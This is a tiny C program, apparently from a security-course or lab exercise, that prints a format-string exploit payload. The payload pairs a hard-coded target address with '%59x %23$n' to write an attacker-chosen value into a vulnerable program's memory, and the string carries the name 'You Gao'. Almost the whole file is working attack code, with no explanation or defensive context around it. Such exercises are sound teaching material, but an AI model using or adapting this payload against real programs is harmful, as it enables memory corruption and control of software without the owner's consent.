#include <stdio.h>

char attackString[] = "\x2a\xa0\x04\x08 %59x %23$n\nYou Gao\n";

int main() {
	int i;
	char *p = attackString;
	for (i=0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	return 1;
}
